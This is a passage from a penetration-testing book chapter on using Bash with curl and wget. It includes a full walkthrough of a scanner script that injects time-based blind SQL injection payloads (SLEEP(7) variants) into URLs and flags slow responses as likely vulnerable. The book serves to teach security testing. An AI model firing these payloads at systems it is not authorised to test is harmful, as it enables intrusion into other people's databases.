     <span class="koboSpan" id="kobo.271.1">
      curl -X POST https://example.com/upload --
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.272.1">
       data-binary @file.txt
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.273.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.274.1">
     Often, pentesters need to combine multiple options to craft specific requests.
    </span>
    <span class="koboSpan" id="kobo.274.2">
     Here’s an advanced example:
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.275.1">
      curl -X POST https://example.com/api -H "Authorization: Bearer &lt;token&gt;" -H "Content-Type: application/json" -
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.276.1">
       d @data.json
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.277.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.278.1">
     The following points explain the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.279.1">
      preceding command:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.280.1">
       -H "Content-Type: application/json"
      </span>
     </strong>
     <span class="koboSpan" id="kobo.281.1">
      : Specifies the content type of the data
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.282.1">
       being sent
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.283.1">
       -d @data.json
      </span>
     </strong>
     <span class="koboSpan" id="kobo.284.1">
      : Sends the contents of
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.285.1">
       data.json
      </span>
     </strong>
     <span class="koboSpan" id="kobo.286.1">
      with
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.287.1">
       the request
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.288.1">
     It’s crucial to handle HTTP responses
    </span>
    <a id="_idIndexMarker519">
    </a>
    <span class="koboSpan" id="kobo.289.1">
     to analyze the behavior of the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.290.1">
      web application:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.291.1">
#!/usr/bin/env bash
response=$(curl -s -o /dev/null -w "%{http_code}" https://example.com)
if [ "$response" -eq 200 ]; then
  echo "Request was successful."
</span><span class="koboSpan" id="kobo.291.2">else
  echo "Request failed with response code $response."
</span><span class="koboSpan" id="kobo.291.3">fi</span></pre>
   <p>
    <span class="koboSpan" id="kobo.292.1">
     Let’s look at the code
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.293.1">
      more closely:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.294.1">
       response=$(...)
      </span>
     </strong>
     <span class="koboSpan" id="kobo.295.1">
      : It captures the HTTP response code in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.296.1">
       a variable.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.297.1">
       -s -o /dev/null -w "%{http_code}"
      </span>
     </strong>
     <span class="koboSpan" id="kobo.298.1">
      : Silent mode, discard output, and print only the HTTP response code.
     </span>
     <span class="koboSpan" id="kobo.298.2">
      See
     </span>
     <a href="https://curl.se/docs/manpage.html#-w">
      <span class="koboSpan" id="kobo.299.1">
       https://curl.se/docs/manpage.html#-w
      </span>
     </a>
     <span class="koboSpan" id="kobo.300.1">
      for more information about the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.301.1">
       -w
      </span>
     </strong>
     <span class="koboSpan" id="kobo.302.1">
      option and
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.303.1">
       its use.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.304.1">
      The
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.305.1">
       if
      </span>
     </strong>
     <span class="koboSpan" id="kobo.306.1">
      block analyzes the response code.
     </span>
     <span class="koboSpan" id="kobo.306.2">
      If the response code is
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.307.1">
       200
      </span>
     </strong>
     <span class="koboSpan" id="kobo.308.1">
      , the request
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.309.1">
       was successful.
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.310.1">
     Pentesters often need to automate multiple requests.
    </span>
    <span class="koboSpan" id="kobo.310.2">
     Here’s an example using
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.311.1">
      a loop:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.312.1">
for i in {1..10}; do
  curl -X GET "https://example.com/page$i" -H "Authorization: Bearer &lt;token&gt;"
done</span></pre>
   <p>
    <span class="koboSpan" id="kobo.313.1">
     Let’s break down the code and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.314.1">
      understand it:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.315.1">
       for i in {1..10}
      </span>
     </strong>
     <span class="koboSpan" id="kobo.316.1">
      : Loops from 1
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.317.1">
       to 10
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.318.1">
       "https://example.com/page$i"
      </span>
     </strong>
     <span class="koboSpan" id="kobo.319.1">
      : Dynamically constructs the URL for the page number for
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.320.1">
       each iteration
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.321.1">
     Sometimes, you just want
    </span>
    <a id="_idIndexMarker520">
    </a>
    <span class="koboSpan" id="kobo.322.1">
     to check the HTTP response headers and discard the rest:
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.323.1">
      curl -
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.324.1">
       I "https://www.example.com/
      </span>
     </strong>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.325.1">
     Here is
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.326.1">
      an example:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer095">
     <span class="koboSpan" id="kobo.327.1">
      <img alt="Figure 9.3 – Capturing the headers from an HTTP request" src="image/B22229_09_03.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.328.1">
     Figure 9.3 – Capturing the headers from an HTTP request
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.329.1">
     Tip
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.330.1">
     If you experience errors when creating HTTP requests in the Bash shell, send requests through a proxy or save a packet capture to aid troubleshooting.
    </span>
    <span class="koboSpan" id="kobo.330.2">
     This will allow you to see what is being sent and received, which may look different from what you intended due to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.331.1">
      encoding issues.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.332.1">
     Now that you have a good foundation
    </span>
    <a id="_idIndexMarker521">
    </a>
    <span class="koboSpan" id="kobo.333.1">
     of knowledge on using
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.334.1">
      curl
     </span>
    </strong>
    <span class="koboSpan" id="kobo.335.1">
     to make HTTP requests, let’s put that knowledge to work and examine a real-world use case.
    </span>
    <span class="koboSpan" id="kobo.335.2">
     The next example will demonstrate how to use Bash scripting for SQLi payloads.
    </span>
    <span class="koboSpan" id="kobo.335.3">
     The example code can be found in the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.336.1">
      ch09_sqliscanner.sh
     </span>
    </strong>
    <span class="koboSpan" id="kobo.337.1">
     file in this chapter’s folder in the GitHub repository.
    </span>
    <span class="koboSpan" id="kobo.337.2">
     As in previous chapters, I’ll be breaking the script up into sections so that I can explain the code.
    </span>
    <span class="koboSpan" id="kobo.337.3">
     It may be helpful to open the code from GitHub on another screen or use split-screen to help you follow the script structure at a high level as we examine each line in detail in
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.338.1">
      this text.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.339.1">
     The following code is a function to check if
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.340.1">
      curl
     </span>
    </strong>
    <span class="koboSpan" id="kobo.341.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.342.1">
      parallel
     </span>
    </strong>
    <span class="koboSpan" id="kobo.343.1">
     dependencies are installed.
    </span>
    <span class="koboSpan" id="kobo.343.2">
     If not, print an
    </span>
    <a id="_idIndexMarker522">
    </a>
    <span class="koboSpan" id="kobo.344.1">
     error message
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.345.1">
      and exit:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.346.1">
#!/usr/bin/env bash
check_dependencies() {
    for cmd in curl parallel; do
        if ! </span><span class="koboSpan" id="kobo.346.2">command -v $cmd &amp;&gt; /dev/null; then
            echo "$cmd could not be found. </span><span class="koboSpan" id="kobo.346.3">Please install it."
</span><span class="koboSpan" id="kobo.346.4">            exit 1
        fi
    done
}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.347.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.348.1">
      print_usage
     </span>
    </strong>
    <span class="koboSpan" id="kobo.349.1">
     function contains the usage instructions for
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.350.1">
      the script:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.351.1">
print_usage() {
    echo "Usage: $0 -u URL -c COOKIE_HEADER"
    echo "       $0 -f URL_FILE -c COOKIE_HEADER"
    echo "URL must contain 'FUZZ' where payloads should be inserted."
</span><span class="koboSpan" id="kobo.351.2">}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.352.1">
     In another part of the script, if the proper command-line arguments are not provided, it calls this function, which prints the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.353.1">
      usage instructions.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.354.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.355.1">
      perform_sql_test
     </span>
    </strong>
    <span class="koboSpan" id="kobo.356.1">
     function sets two local variables and initializes them to the two provided
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.357.1">
      function arguments:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.358.1">
perform_sqli_test() {
    local url=$1
    local cookie_header=$2</span></pre>
   <p>
    <span class="koboSpan" id="kobo.359.1">
     In the following code, we ensure the URL contains
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.360.1">
      FUZZ
     </span>
    </strong>
    <span class="koboSpan" id="kobo.361.1">
     for payload insertion; otherwise, print an error
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.362.1">
      and exit:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.363.1">
    if [[ $url != *"FUZZ"* ]]; then
        echo "Error: URL must contain 'FUZZ' where payloads should be inserted."
</span><span class="koboSpan" id="kobo.363.2">        print_usage
        exit 1
    fi</span></pre>
   <p>
    <span class="koboSpan" id="kobo.364.1">
     Here we define an array of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.365.1">
      SQLi payloads:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.366.1">
    local payloads=(
        "(SELECT(0)FROM(SELECT(SLEEP(7)))a)"
        "'XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z"
        "' AND (SELECT 4800 FROM (SELECT(SLEEP(7)))HoBG)--"
        "if(now()=sysdate(),SLEEP(7),0)"
        "'XOR(if(now()=sysdate(),SLEEP(7),0))XOR'Z"
        "'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(7) ELSE 0 END)XOR'Z"
    )</span></pre>
   <p>
    <span class="koboSpan" id="kobo.367.1">
     In the following code, we loop
    </span>
    <a id="_idIndexMarker523">
    </a>
    <span class="koboSpan" id="kobo.368.1">
     through the array
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.369.1">
      of payloads:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.370.1">
    for payload in "${payloads[@]}"; do
        start_time=$(date +%s)</span></pre>
   <p>
    <span class="koboSpan" id="kobo.371.1">
     The start time is saved to the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.372.1">
      start_time
     </span>
    </strong>
    <span class="koboSpan" id="kobo.373.1">
     variable for reference at the end of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.374.1">
      the loop.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.375.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.376.1">
      fuzzed_url
     </span>
    </strong>
    <span class="koboSpan" id="kobo.377.1">
     variable is assigned the result of the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.378.1">
      ${url//FUZZ/$payload}
     </span>
    </strong>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.379.1">
      parameter expansion:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.380.1">
        fuzzed_url=${url//FUZZ/$payload}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.381.1">
     This is a parameter expansion syntax in Bash used for string manipulation.
    </span>
    <span class="koboSpan" id="kobo.381.2">
     This tells Bash to replace all occurrences of
    </span>
    <a id="_idIndexMarker524">
    </a>
    <span class="koboSpan" id="kobo.382.1">
     the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.383.1">
      FUZZ
     </span>
    </strong>
    <span class="koboSpan" id="kobo.384.1">
     string within the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.385.1">
      url
     </span>
    </strong>
    <span class="koboSpan" id="kobo.386.1">
     variable with the current value
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.387.1">
      of
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.388.1">
       $payload
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.389.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.390.1">
     Here we send a request to the fuzzed URL with or without the cookie header, depending on
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.391.1">
      command-line arguments:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.392.1">
        if [ -n "$cookie_header" ]; then
            curl -s -o /dev/null --max-time 20 -H "Cookie: $cookie_header" "$fuzzed_url"
        else
            curl -s -o /dev/null --max-time 20 "$fuzzed_url"
        fi</span></pre>
   <p>
    <span class="koboSpan" id="kobo.393.1">
     The following code calculates the duration of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.394.1">
      the request:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.395.1">
        end_time=$(date +%s)
        duration=$((end_time - start_time))</span></pre>
   <p>
    <span class="koboSpan" id="kobo.396.1">
     The following code checks if the request duration indicates a potential time-based
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.397.1">
      SQLi vulnerability:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.398.1">
        if ((duration &gt;= 7 &amp;&amp; duration &lt;= 16)); then
            echo "Potential time-based SQL injection vulnerability detected on $url with payload: $payload"
            break
        fi
    done
}
export -f perform_sqli_test</span></pre>
   <p>
    <span class="koboSpan" id="kobo.399.1">
     A value of 7 seconds was included in each payload.
    </span>
    <span class="koboSpan" id="kobo.399.2">
     We expect the response to take at least 7 seconds or longer based on network conditions and server load.
    </span>
    <span class="koboSpan" id="kobo.399.3">
     We exported the function so that it can be called in
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.400.1">
      the shell.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.401.1">
     Here we process a list of
    </span>
    <a id="_idIndexMarker525">
    </a>
    <span class="koboSpan" id="kobo.402.1">
     URLs by either reading from a file or using a
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.403.1">
      single URL:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.404.1">
process_urls() {
    local url_list=$1
    local cookie_header=$2
    if [ -f "$url_list" ]; then
        cat "$url_list" | parallel perform_sqli_test {} "$cookie_header"
    else
        perform_sqli_test "$url_list" "$cookie_header"
    fi
}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.405.1">
     Next, we call the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.406.1">
      check_dependencies
     </span>
    </strong>
    <span class="koboSpan" id="kobo.407.1">
     function defined at the start of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.408.1">
      the script:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.409.1">
check_dependencies</span></pre>
   <p>
    <span class="koboSpan" id="kobo.410.1">
     The following code parses the command-line arguments for the URL, URL file, and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.411.1">
      cookie header:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.412.1">
while getopts "u:f:c:" opt; do
    case $opt in
        u) URL=$OPTARG ;;
        f) URL_FILE=$OPTARG ;;
        c) COOKIE_HEADER=$OPTARG ;;
        *) echo "Invalid option: -$OPTARG" ;;
    esac
done</span></pre>
   <p>
    <span class="koboSpan" id="kobo.413.1">
     Here we validate the input
    </span>
    <a id="_idIndexMarker526">
    </a>
    <span class="koboSpan" id="kobo.414.1">
     and ensure that either a URL or a URL file
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.415.1">
      is provided:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.416.1">
if [ -z "$URL" ] &amp;&amp; [ -z "$URL_FILE" ]; then
    echo "You must provide a URL with -u or a file containing URLs with -f."
</span><span class="koboSpan" id="kobo.416.2">    print_usage
    exit 1
fi</span></pre>
   <p>
    <span class="koboSpan" id="kobo.417.1">
     Next, we process the URLs based on the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.418.1">
      provided input:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.419.1">
if [ -n "$URL" ]; then
    process_urls "$URL" "$COOKIE_HEADER"
elif [ -n "$URL_FILE" ]; then
    process_urls "$URL_FILE" "$COOKIE_HEADER"
fi</span></pre>
   <p>
    <span class="koboSpan" id="kobo.420.1">
     The following output is found in the terminal after one of the payloads results in a response that takes longer than 7 seconds to complete.
    </span>
    <span class="koboSpan" id="kobo.420.2">
     The URL and payload that triggered the SQLi is printed to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.421.1">
      the terminal:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer096">
     <span class="koboSpan" id="kobo.422.1">
      <img alt="Figure 9.4 – A successful SQLi URL and payload are printed to the terminal" src="image/B22229_09_04.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.423.1">
     Figure 9.4 – A successful SQLi URL and payload are printed to the terminal
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.424.1">
     Tip
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.425.1">
     When including authentication cookies or tokens with a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.426.1">
      curl
     </span>
    </strong>
    <span class="koboSpan" id="kobo.427.1">
     request, bear in mind the difference between the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.428.1">
      -b
     </span>
    </strong>
    <span class="koboSpan" id="kobo.429.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.430.1">
      -H
     </span>
    </strong>
    <span class="koboSpan" id="kobo.431.1">
     options.
    </span>
    <span class="koboSpan" id="kobo.431.2">
     If you use
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.432.1">
      -b
     </span>
    </strong>
    <span class="koboSpan" id="kobo.433.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.434.1">
      curl
     </span>
    </strong>
    <span class="koboSpan" id="kobo.435.1">
     inserts
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.436.1">
      Cookie:
     </span>
    </strong>
    <span class="koboSpan" id="kobo.437.1">
     in the request, followed by the cookie value you specify.
    </span>
    <span class="koboSpan" id="kobo.437.2">
     If you use
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.438.1">
      -H
     </span>
    </strong>
    <span class="koboSpan" id="kobo.439.1">
     , supply the full value.
    </span>
    <span class="koboSpan" id="kobo.439.2">
     See the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.440.1">
      -b
     </span>
    </strong>
    <span class="koboSpan" id="kobo.441.1">
     parameter in
    </span>
    <span class="No-Break">
     <em class="italic">
      <span class="koboSpan" id="kobo.442.1">
       Figure 9
      </span>
     </em>
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.443.1">
      .4
     </span>
    </em>
    <span class="koboSpan" id="kobo.444.1">
     where I left off the beginning of the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.445.1">
      Cookie
     </span>
    </strong>
    <span class="koboSpan" id="kobo.446.1">
     header, and compare that to
    </span>
    <span class="No-Break">
     <em class="italic">
      <span class="koboSpan" id="kobo.447.1">
       Figure 9
      </span>
     </em>
    </span>
    <span class="No-Break">
     <em class="italic">
      <span class="koboSpan" id="kobo.448.1">
       .5
      </span>
     </em>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.449.1">
      .
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer097">
     <span class="koboSpan" id="kobo.450.1">
      <img alt="Figure 9.5 – The Cookie header is highlighted to make a point" src="image/B22229_09_05.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.451.1">
     Figure 9.5 – The Cookie header is highlighted to make a point
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.452.1">
     After learning about
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.453.1">
      curl
     </span>
    </strong>
    <span class="koboSpan" id="kobo.454.1">
     , I want to briefly mention
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.455.1">
      wget
     </span>
    </strong>
    <span class="koboSpan" id="kobo.456.1">
     .
    </span>
    <span class="koboSpan" id="kobo.456.2">
     Both
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.457.1">
      curl
     </span>
    </strong>
    <span class="koboSpan" id="kobo.458.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.459.1">
      wget
     </span>
    </strong>
    <span class="koboSpan" id="kobo.460.1">
     are command-line tools for
    </span>
    <a id="_idIndexMarker527">
    </a>
    <span class="koboSpan" id="kobo.461.1">
     downloading files from the internet, but they have different features and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.462.1">
      use cases.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.463.1">
     The following are features
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.464.1">
      of
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.465.1">
       curl
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.466.1">
      :
     </span>
    </span>
   </p>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.467.1">
      Designed for transferring data with
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.468.1">
       URL syntax
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.469.1">
      Supports a wide range of protocols (HTTP, HTTPS, FTP, SFTP, SCP, and
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.470.1">
       so on)
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.471.1">
      Can send data to a server using various HTTP methods (
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.472.1">
       GET
      </span>
     </strong>
     <span class="koboSpan" id="kobo.473.1">
      ,
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.474.1">
       POST
      </span>
     </strong>
     <span class="koboSpan" id="kobo.475.1">
      ,
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.476.1">
       PUT
      </span>
     </strong>
     <span class="koboSpan" id="kobo.477.1">
      ,
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.478.1">
       DELETE
      </span>
     </strong>
     <span class="koboSpan" id="kobo.479.1">
      , and
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.480.1">
       so on)
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.481.1">
      Supports
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.482.1">
       uploading files
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.483.1">
      More suitable for complex operations such as interacting
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.484.1">
       with APIs
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.485.1">
     The following are features
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.486.1">
      of
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.487.1">
       wget
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.488.1">
      :
     </span>
    </span>
   </p>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.489.1">
      Primarily designed for downloading files from
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.490.1">
       the web
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.491.1">
      Supports HTTP, HTTPS, and
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.492.1">
       FTP protocols
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.493.1">
      Can recursively download files, which makes it useful for
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.494.1">
       mirroring websites
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.495.1">
      Designed to handle unreliable network connections by
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.496.1">
       retrying downloads
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.497.1">
      More suitable for bulk downloading and
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.498.1">
       website mirroring
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.499.1">
     The most straightforward
    </span>
    <a id="_idIndexMarker528">
    </a>
    <span class="koboSpan" id="kobo.500.1">
     use of
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.501.1">
      wget
     </span>
    </strong>
    <span class="koboSpan" id="kobo.502.1">
     is to download a single file from
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.503.1">
      a URL:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.504.1">
$ wget http://example.com/file.zip</span></pre>
   <p>
    <span class="koboSpan" id="kobo.505.1">
     You can specify a different name for the downloaded file using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.506.1">
      -
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.507.1">
       O
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.508.1">
      option:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.509.1">
$ wget -O newname.zip http://example.com/file.zip</span></pre>
   <p>
    <span class="koboSpan" id="kobo.510.1">
     If a download gets interrupted, you can resume it with the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.511.1">
      -
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.512.1">
       c
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.513.1">
      option:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.514.1">
$ wget -c http://example.com/file.zip</span></pre>
   <p>
    <span class="koboSpan" id="kobo.515.1">
     You can download files in the background using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.516.1">
      -
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.517.1">
       b
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.518.1">
      option:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.519.1">
$ wget -b http://example.com/file.zip</span></pre>
   <p>
    <span class="koboSpan" id="kobo.520.1">
     You can mirror a website using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.521.1">
      -r
     </span>
    </strong>
    <span class="koboSpan" id="kobo.522.1">
     (recursive) and
    </span>
